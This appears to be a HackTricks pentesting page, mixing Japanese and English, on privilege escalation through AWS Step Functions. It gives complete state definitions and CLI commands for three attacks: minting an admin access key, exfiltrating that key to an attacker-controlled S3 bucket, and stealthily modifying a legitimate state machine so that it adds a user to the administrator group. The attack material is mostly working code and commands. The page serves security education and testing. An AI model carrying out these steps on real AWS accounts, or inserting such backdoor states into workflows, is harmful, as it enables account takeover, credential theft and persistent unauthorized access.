# AWS - Step Functions Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## Step Functions

この AWS サービスの詳細については、次を参照してください：

{{#ref}}
../../aws-services/aws-stepfunctions-enum.md
{{#endref}}

### タスクリソース

These privilege escalation techniques are going to require to use some AWS Step Functions リソース in order to perform the desired privilege escalation actions.

利用可能なアクションをすべて確認するには、自分の AWS アカウントで該当するアクションを選択し、使用されているパラメータを確認できます。例：

<figure><img src="../../../images/telegram-cloud-photo-size-4-5920521132757336440-y.jpg" alt=""><figcaption></figcaption></figure>

または、AWS の API ドキュメントで各アクションのドキュメントを確認できます：

- [**AddUserToGroup**](https://docs.aws.amazon.com/IAM/latest/APIReference/API_AddUserToGroup.html)
- [**GetSecretValue**](https://docs.aws.amazon.com/secretsmanager/latest/apireference/API_GetSecretValue.html)

### `states:TestState` & `iam:PassRole`

**`states:TestState`** と **`iam:PassRole`** の権限を持つ攻撃者は、既存の state machine を作成・更新することなく任意の state をテストし、任意の IAM ロールを渡すことができます。これにより、そのロールの権限によって他の AWS サービスへ不正にアクセスされる可能性があります。これらの権限が組み合わさると、ワークフローの操作やデータ改ざん、データ漏洩、リソース操作、そして privilege escalation に至るような広範な不正行為を引き起こす可能性があります。
```bash
aws states test-state --definition <value> --role-arn <value> [--input <value>] [--inspection-level <value>] [--reveal-secrets | --no-reveal-secrets]
```
以下の例は、これらの権限とAWS環境の寛容なロールを利用して**`admin`**ユーザーのアクセスキーを作成するstateをテストする方法を示します。 この寛容なロールには、stateが**`iam:CreateAccessKey`**アクションを実行できるようにする任意の高権限ポリシー（例 **`arn:aws:iam::aws:policy/AdministratorAccess`**）が関連付けられている必要があります:

- **stateDefinition.json**:
```json
{
"Type": "Task",
"Parameters": {
"UserName": "admin"
},
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"End": true
}
```
- **コマンド**: privesc を実行するためのコマンド:
```bash
aws stepfunctions test-state --definition file://stateDefinition.json --role-arn arn:aws:iam::<account-id>:role/PermissiveRole

{
"output": "{
\"AccessKey\":{
\"AccessKeyId\":\"AKIA1A2B3C4D5E6F7G8H\",
\"CreateDate\":\"2024-07-09T16:59:11Z\",
\"SecretAccessKey\":\"1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j\",
\"Status\":\"Active\",
\"UserName\":\"admin\"
}
}",
"status": "SUCCEEDED"
}
```
**潜在的な影響**: ワークフローの不正な実行や操作、および機密リソースへのアクセスにつながり、重大なセキュリティ侵害を引き起こす可能性があります。

### `states:CreateStateMachine` & `iam:PassRole` & (`states:StartExecution` | `states:StartSyncExecution`)

An attacker with the **`states:CreateStateMachine`**& **`iam:PassRole`** would be able to create an ステートマシン and provide to it any IAM role, enabling unauthorized access to other AWS services with the roles' permissions. In contrast with the previous privesc technique (**`states:TestState`** & **`iam:PassRole`**), this one does not execute by itself, you will also need to have the **`states:StartExecution`** or **`states:StartSyncExecution`** permissions (**`states:StartSyncExecution`** is **not available for standard workflows**, **just to express state machines**) in order to start and execution over the state machine.
```bash
# Create a state machine
aws states create-state-machine --name <value> --definition <value> --role-arn <value> [--type <STANDARD | EXPRESS>] [--logging-configuration <value>]\
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]

# Start a state machine execution
aws states start-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]

# Start a Synchronous Express state machine execution
aws states start-sync-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
```
以下の例は、状態マシンを作成して **`admin`** ユーザーのアクセスキーを作成し、このアクセスキーを攻撃者が管理する S3 バケットへ流出させる方法を示します。これは、これらの権限と AWS 環境の許容的なロールを利用します。この許容的なロールには、状態マシンが **`iam:CreateAccessKey`** および **`s3:putObject`** アクションを実行できるように、任意の高権限ポリシー（例： **`arn:aws:iam::aws:policy/AdministratorAccess`**）がアタッチされている必要があります。

- **stateMachineDefinition.json**:
```json
{
"Comment": "Malicious state machine to create IAM access key and upload to S3",
"StartAt": "CreateAccessKey",
"States": {
"CreateAccessKey": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"Parameters": {
"UserName": "admin"
},
"ResultPath": "$.AccessKeyResult",
"Next": "PrepareS3PutObject"
},
"PrepareS3PutObject": {
"Type": "Pass",
"Parameters": {
"Body.$": "$.AccessKeyResult.AccessKey",
"Bucket": "attacker-controlled-S3-bucket",
"Key": "AccessKey.json"
},
"ResultPath": "$.S3PutObjectParams",
"Next": "PutObject"
},
"PutObject": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:s3:putObject",
"Parameters": {
"Body.$": "$.S3PutObjectParams.Body",
"Bucket.$": "$.S3PutObjectParams.Bucket",
"Key.$": "$.S3PutObjectParams.Key"
},
"End": true
}
}
}
```
- **コマンド** を実行して **ステートマシンを作成する**:
```bash
aws stepfunctions create-state-machine --name MaliciousStateMachine --definition file://stateMachineDefinition.json --role-arn arn:aws:iam::123456789012:role/PermissiveRole
{
"stateMachineArn": "arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine",
"creationDate": "2024-07-09T20:29:35.381000+02:00"
}
```
- **コマンド** を実行して、以前に作成したステートマシンの **実行を開始する**:
```json
aws stepfunctions start-execution --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine
{
"executionArn": "arn:aws:states:us-east-1:123456789012:execution:MaliciousStateMachine:1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f",
"startDate": "2024-07-09T20:33:35.466000+02:00"
}
```
> [!WARNING]
> 攻撃者が制御する S3 バケットは、被害者アカウントからの s3:PutObject アクションを受け入れる権限を持っている必要があります。

**潜在的な影響**: ワークフローの不正な実行や操作、機密リソースへのアクセスを招き、重大なセキュリティ侵害につながる可能性があります。

### `states:UpdateStateMachine` & (not always required) `iam:PassRole`

`states:UpdateStateMachine` の権限を持つ攻撃者は、ステートマシンの定義を変更して、権限昇格につながるステルスなステートを追加することができます。これにより、正当なユーザーがステートマシンの実行を開始すると、この新しい悪意あるステルスステートが実行され、権限昇格が成功します。

ステートマシンに紐づく IAM ロールの許可の度合いによって、攻撃者は次の2つの状況に直面します:

1. **権限が緩い IAM ロール**: ステートマシンに紐づく IAM ロールが既に権限が緩い（例えば **`arn:aws:iam::aws:policy/AdministratorAccess`** ポリシーがアタッチされている）場合、ステートマシン定義の更新だけで十分なため、権限昇格に **`iam:PassRole`** の許可は必要ありません。
2. **制限された IAM ロール**: 前の場合とは対照的に、この場合はステートマシン定義の変更に加えて許容的な IAM ロールをステートマシンに関連付ける必要があるため、攻撃者は **`iam:PassRole`** の許可も必要になります。
```bash
aws states update-state-machine --state-machine-arn <value> [--definition <value>] [--role-arn <value>] [--logging-configuration <value>] \
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
```
以下の例は、HelloWorld Lambda function を呼び出すだけの正当なステートマシンを更新して、ユーザー **`unprivilegedUser`** を **`administrator`** IAM Group に追加する追加の state を挿入する方法を示します。こうすることで、正当なユーザーが更新されたステートマシンの実行を開始すると、この新しい悪意のあるステルス state が実行され、権限昇格が成功します。

> [!WARNING]
> ステートマシンに許容的な IAM Role が関連付けられていない場合、許容的な IAM Role を関連付けるために IAM Role を更新する際に **`iam:PassRole`** 権限も必要になります（例えば **`arn:aws:iam::aws:policy/AdministratorAccess`** ポリシーがアタッチされたもの）。

{{#tabs }}
{{#tab name="Legit State Machine" }}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{{#endtab }}

{{#tab name="Malicious Updated State Machine" }}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "AddUserToGroup"
},
"AddUserToGroup": {
"Type": "Task",
"Parameters": {
"GroupName": "administrator",
"UserName": "unprivilegedUser"
},
"Resource": "arn:aws:states:::aws-sdk:iam:addUserToGroup",
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{{#endtab }}
{{#endtabs }}

- **コマンド** が **正規のステートマシン** を **更新** するために実行された:
```bash
aws stepfunctions update-state-machine --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:HelloWorldLambda --definition file://StateMachineUpdate.json
{
"updateDate": "2024-07-10T20:07:10.294000+02:00",
"revisionId": "1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f"
}
```
**潜在的な影響**: ワークフローの不正な実行や改ざん、機密リソースへのアクセスを許し、重大なセキュリティ侵害を引き起こす可能性があります。

{{#include ../../../../banners/hacktricks-training.md}}
